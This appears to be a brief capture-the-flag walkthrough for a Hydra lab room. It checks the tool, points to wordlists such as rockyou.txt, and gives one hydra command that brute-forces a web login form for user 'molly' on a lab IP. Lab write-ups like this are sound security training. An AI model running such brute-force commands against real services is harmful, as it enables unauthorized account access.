# Thm-hydra
walktrough

<h5> Step 1 : </h5>
  <p>check whether hydra is installed or not   </p>

`` hydra --version or hydra --v `` 

<h5>Step 2: </h5>
  <p>locate your  wordlists like passlist.txt  or rockyou.txt files </p>
  <p> usually wordlists are in <b> /usr/share/wordlists  </b> </p>
  
  <h5> Step 3 :</h5>
  use hydra
  
  ```$hydra -l molly -P rockyou.txt.gz 10.10.177.58 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f ```

  ![image](https://user-images.githubusercontent.com/89000059/221360583-5d068075-1a7a-41c7-aea9-d6e1d93fa27d.png)

  
  ![image](https://user-images.githubusercontent.com/89000059/221360487-f899ba35-2fc4-430a-a0a2-b9c575289413.png)

